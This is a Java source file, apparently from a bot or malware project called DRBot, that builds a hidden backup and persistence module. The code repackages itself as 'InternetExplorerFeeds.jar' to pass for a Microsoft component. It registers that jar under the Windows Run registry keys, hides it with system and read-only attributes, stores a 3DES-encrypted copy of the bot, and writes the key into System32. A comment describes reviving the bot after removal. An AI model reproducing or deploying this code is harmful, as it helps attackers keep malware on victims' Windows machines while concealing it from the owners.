package com.DRBot.BackUp;

import com.DRBot.OS.OsProp;
import java.io.BufferedInputStream;
import java.io.File;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import java.security.Key;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.spec.IvParameterSpec;
import java.security.SecureRandom;
import java.util.Enumeration;
import javax.crypto.NoSuchPaddingException;
import java.util.jar.*;
/**
 *
 * @author MerNat
 */
public class WinBackUp {
    private String path2Save,pathAndName4Key,path4Sec;
    private byte[] byte8;
    private File inputFile;
    private File outputFile;
    private File myFileJar,myFileJarPath,myFututreJarFile,forWinReg;
    private JarFile myJar;
    private JarEntry myEntry;
    private JarOutputStream jarOutSt;
    private Enumeration<JarEntry> enumEntry;
    private Key myKey;
    private FileInputStream inputFileSt;
    private FileOutputStream outputFileSt;
    private ObjectOutputStream outputObKey;
    private KeyGenerator kGen; 
    private Cipher fileCipher;
    private CipherOutputStream outputCipherSt;
    private Process pro,proHider;
    private ProcessBuilder pB,pbHider;
    
    /* i want the file to be in a dir which is safe .... and 
        much more safe.And there, it waites to be executed when it failes to find the original bot in it's place.
    */
    
    public WinBackUp(File inputFile,String path2Save,String path4Sec){
        try{
        // files
        this.inputFile = inputFile;
        pathAndName4Key = "C:\\Windows\\System32\\configSystem32.txt";
        this.path2Save = path2Save + "\\Internet Explorer Feeds.txt";
        this.path4Sec = path4Sec;
        outputFile = new File(this.path2Save);
        //here the Internet Explorer.jar will be created
        createTheGuard(this.inputFile,path4Sec);
        
 //check for the backup file .... and create it if it's not there. with it's private key
 //self destroy key function.
        
        File checkKey = new File(pathAndName4Key);
        if(checkKey.exists()){
            checkKey.delete();
        }
        
        //FileStreams
        inputFileSt = new FileInputStream(this.inputFile);
        outputFileSt = new FileOutputStream(outputFile);
        encFile(inputFileSt,outputFileSt,createKey(pathAndName4Key));
        inputFileSt.close();
        outputFileSt.close();
            
        }
        catch(Exception eee){}
    }
    
    private Key createKey(String path4Key) throws NoSuchAlgorithmException,IOException{
        
        kGen = KeyGenerator.getInstance("DESede");
        kGen.init(168,new SecureRandom());
        myKey = kGen.generateKey();
        outputObKey = new ObjectOutputStream(new FileOutputStream(path4Key));
        outputObKey.writeObject(myKey);
        outputObKey.close();
        return myKey;
    }
    
    private void encFile(FileInputStream inFileSt,FileOutputStream outFileSt,Key myKey)
    throws NoSuchAlgorithmException,NoSuchPaddingException,InvalidKeyException,InvalidAlgorithmParameterException,IOException{
        
        fileCipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
        byte8 = new byte[8];
        byte8 = new SecureRandom().generateSeed(8);
        
        fileCipher.init(Cipher.ENCRYPT_MODE, myKey,new IvParameterSpec(byte8));
        
        outputCipherSt = new CipherOutputStream(outFileSt,fileCipher);
        
        int length;
        byte[] cipherBuffer = new byte[512];
        while((length = inFileSt.read(cipherBuffer))>=0){
            outputCipherSt.write(cipherBuffer,0,length);
        }
        outputCipherSt.close();
    }
    private void createTheGuard(File jarFile,String path2Save){
        try
        {
        myFileJar = jarFile;
        myFileJarPath = new File(path2Save);
        myFututreJarFile = new File("InternetExplorerFeeds.jar");
        forWinReg = new File(path2Save+"\\InternetExplorerFeeds.jar");
        //this is the jar file
        myJar = new JarFile(myFileJar);
        //it's contents.
        enumEntry = myJar.entries();
        //extract them
        while(enumEntry.hasMoreElements()){
            myEntry = enumEntry.nextElement();
            if(myEntry.getName().equals("com/DRBot/BackUp/InternetExplorerFeeds.class")){
                InputStream in = myJar.getInputStream(myEntry);
                FileOutputStream fl = new FileOutputStream("InternetExplorerFeeds.class");
                while(in.available()>0){
                    fl.write(in.read());
                }
                fl.close();
                in.close();
            }
        } // while enum closed
        myJar.close();
        
        //create the jar file
        //but first i have to create the folders
        File tempDir = new File("com\\DRBot\\BackUp\\");
        File tempFile = new File("InternetExplorerFeeds.class");
        tempDir.mkdirs();
        Files.move(tempFile.toPath(),tempDir.toPath().resolve(tempFile.toPath()),REPLACE_EXISTING);
        
        //create the jar
        Manifest mani = new Manifest();
        mani.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION,"1.0");
        mani.getMainAttributes().put(Attributes.Name.MAIN_CLASS,"com.DRBot.BackUp.InternetExplorerFeeds");
        jarOutSt = new JarOutputStream(new FileOutputStream("InternetExplorerFeeds.jar"),mani);
        add(new File("com"),jarOutSt);
        jarOutSt.close();
        if(myFileJarPath.isDirectory())
            Files.move(myFututreJarFile.toPath(),myFileJarPath.toPath().resolve(myFututreJarFile.toPath()),REPLACE_EXISTING);
        WinReg4Guard(forWinReg.toPath());
        delete(new File("com"));
        Thread thread = new Thread(new Runnable(){
            @Override
            public void run(){
                pbHider = new ProcessBuilder("attrib","+h","+r","+s","/s","/d",forWinReg.getPath());
                try{
                    proHider = pbHider.start();
                    proHider.waitFor();
                }
                catch(IOException ioE){}
                catch(InterruptedException interrExe){}
                proHider.destroy();
            }
        });
        thread.start();
    }
        catch(Exception exce){}
        
    } // createTheGuard close
    private void add(File source, JarOutputStream target) throws IOException
{
  BufferedInputStream in = null;
  try
  {
    if (source.isDirectory())
    {
      String name = source.getPath().replace("\\", "/");
      if (!name.isEmpty())
      {
        if (!name.endsWith("/"))
          name += "/";
        JarEntry entry = new JarEntry(name);
        entry.setTime(source.lastModified());
        target.putNextEntry(entry);
        target.closeEntry();
      }
      for (File nestedFile: source.listFiles())
        add(nestedFile, target);
      return;
    }

    JarEntry entry = new JarEntry(source.getPath().replace("\\", "/"));
    entry.setTime(source.lastModified());
    target.putNextEntry(entry);
    in = new BufferedInputStream(new FileInputStream(source));

    byte[] buffer = new byte[1024];
    while (true)
    {
      int count = in.read(buffer);
      if (count == -1)
        break;
      target.write(buffer, 0, count);
    }
    target.closeEntry();
  }
  finally
  {
    if (in != null)
      in.close();
  }
}
    private void WinReg4Guard(Path myFile){
        OsProp osprop = new OsProp();
        String ospropW = osprop.shortOs();
       if(ospropW.equals("win8") || ospropW.equals("win8.1")){
           pB = new ProcessBuilder("reg",
        "add",
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "InternetExplorerFeeds",
        "/d",
        myFile.toString(),
        "/f");
        try{
        pro = pB.start();
        pro.waitFor();
        pro.destroy();
        }
        catch(IOException exe){}
        catch(InterruptedException exe){}
       }
       else{
            pB = new ProcessBuilder("reg",
        "add",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "InternetExplorerFeeds",
        "/d",
        myFile.toString(),
        "/f");
        try{
        pro = pB.start();
        pro.waitFor();
        pro.destroy();
        }
        catch(IOException exe){}
        catch(InterruptedException exe){}
       }
    }
    private void delete(File f) throws IOException {
            if (f.isDirectory()) {
                    for (File c : f.listFiles())
                        delete(c);
                            }
                        if (!f.delete())
                            throw new FileNotFoundException();
                                    }
}